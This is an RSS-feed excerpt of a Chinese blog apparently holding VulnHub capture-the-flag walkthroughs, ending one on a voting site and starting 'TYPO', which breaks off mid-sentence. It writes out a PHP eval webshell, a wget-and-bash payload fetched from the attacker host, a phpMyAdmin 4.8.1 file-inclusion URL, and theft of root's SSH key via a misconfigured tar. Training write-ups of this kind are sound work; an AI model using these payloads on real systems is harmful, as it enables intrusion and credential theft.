 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-723.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-724.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,2082&lt;/p&gt;
&lt;p&gt;发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-725.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-726.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有明显发现，对其目录结构进行扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-727.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==&#34;&gt;http://192.168.0.153/config.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-728.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=&#34;&gt;http://192.168.0.153/config.php.bak&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-729.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP&lt;/p&gt;
&lt;p&gt;但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-730.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，指定规则如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-731.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3ZvdGVub3cubG9jYWw=&#34;&gt;http://votenow.local&lt;/span&gt; 成功显示出来该网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-732.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;做一波目录扫描，发现和原 ip 的扫描内容一模一样&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-733.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wfuzz-扫描子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-扫描子域名&#34;&gt;#&lt;/a&gt; wfuzz 扫描子域名&lt;/h3&gt;
&lt;p&gt;既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python subDomainsBrute.py votenow.local&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-734.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址&lt;/p&gt;
&lt;p&gt;用 wfuzz 来枚举子域名&lt;br&gt;
 &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &amp;quot;Host: FUZZ.votenow.local&amp;quot; --hw 854 --hc 400 votenow.local&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过这种方法收集的子域名的解析地址都是目标靶机的 ip&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-735.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将扫描到的子域名加入到本地 hosts 文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-736.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=&#34;&gt;http://datasafe.votenow.local&lt;/span&gt; , 输入之前泄漏的数据库账户密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-737.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到 phpmyadmin 的权限&lt;/p&gt;
&lt;h3 id=&#34;phpmyadmin后台写shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin后台写shell&#34;&gt;#&lt;/a&gt; phpmyadmin 后台写 shell&lt;/h3&gt;
&lt;p&gt;点击 SQL，尝试执行敏感的 sql 语句，写入 webshell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-738.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-739.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;数据库当前操作用户拥有写权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-740.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;secure_file_priv 参数：&lt;br&gt;
&lt;strong&gt;NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入一句话后门：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php @eval($_POST[&amp;#x27;x&amp;#x27;]);?&amp;gt;&amp;#x27; INTO OUTFILE &amp;#x27;/var/lib/mysql/a.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-741.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-742.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-743.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpmyadmin-漏洞提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-漏洞提权&#34;&gt;#&lt;/a&gt; phpmyadmin 漏洞提权&lt;/h3&gt;
&lt;p&gt;接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-744.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-745.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 paylaod 复制到一个目录下，查阅后开始利用&lt;br&gt;
 &lt;code&gt;python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-746.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-747.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是依然没有反弹 shell 成功，需要进行手动复现&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在SQL语句上写入执行反弹shell的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php system(&amp;quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&amp;quot;);exit;?&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-748.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-749.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-750.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限&lt;br&gt;
 &lt;code&gt;http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-751.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-752.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 apache 用户的网站权限&lt;/p&gt;
&lt;h3 id=&#34;恶意tar命令提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#恶意tar命令提权&#34;&gt;#&lt;/a&gt; 恶意 tar 命令提权&lt;/h3&gt;
&lt;p&gt;搜索一下有没有相关文件的权限设置错误&lt;br&gt;
 &lt;code&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &#39;proc\|home&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发现找到一个 admin 组下的一个命令 tarS&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-753.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 /etc/passwd 确认我们能提权的账户有哪些  &lt;code&gt;cat /etc/passwd | grep bash&lt;/code&gt; &lt;br&gt;
 发现有 admin 和 root 两个账户都存在 bash&lt;br&gt;
john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;/code&gt;  尝试提权&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-754.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确认一下 admin 用户下是否有某些可执行文件的特权&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;find&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -group admin 2&amp;gt;/dev/null | grep -v &amp;#x27;proc\|home&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvf key.tar&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-755.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口&lt;br&gt;
 &lt;code&gt;ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-756.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/127%20TYPO/</guid>
            <title>VULNHUB 27 TYPO</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/127%20TYPO/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=&#34;&gt;https://www.vulnhub.com/entry/typo-1,472/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=&#34;&gt;https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-662.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-663.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8000,8080,8081&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集，发现网站是一个 typo3 的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-664.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://192.168.0.153:8000 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-665.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://192.168.0.153:8080 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-666.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://192.168.0.153:8081 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-667.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-668.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次打开收集到的目录看能否找到更多信息&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=&#34;&gt;http://192.168.31.176:8080/phpinfo.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-669.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集目录: &lt;code&gt;dirsearch -u 192.168.0.153:8081&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-670.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpmyadmin-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmyadmin-渗透测试&#34;&gt;#&lt;/a&gt; phpmyadmin 渗透测试&lt;/h3&gt;
&lt;p&gt;发现敏感地址，phpmyadmin 存在弱口令&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=&#34;&gt;http://192.168.31.176:8081/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-671.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用弱口令 root：root 登陆成功拿到后台的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-672.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对 phpmyadmin 进行写 shell 拿网站权限&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;显示目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%datadir%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select @@basedir;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-673.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;是否可以写入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为/var/lib/mysql-files，只允许导出到此目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-674.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否开启日志记录以及日志保存目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SHOW VARIABLES LIKE &amp;#x27;%general_log%&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;结果为OFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-675.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启写入日志的开关：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log = &amp;quot;ON&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-676.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-677.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改默认的日志写入地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL general_log_file=“1.php”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-678.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; phpmyadmin 拿 shell 失败，得采用其他的方式&lt;/p&gt;
&lt;h3 id=&#34;覆盖admin密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#覆盖admin密码&#34;&gt;#&lt;/a&gt; 覆盖 admin 密码&lt;/h3&gt;
&lt;p&gt;查看 sql 之后看到密码采用 argon 算法&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-679.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码&lt;br&gt;
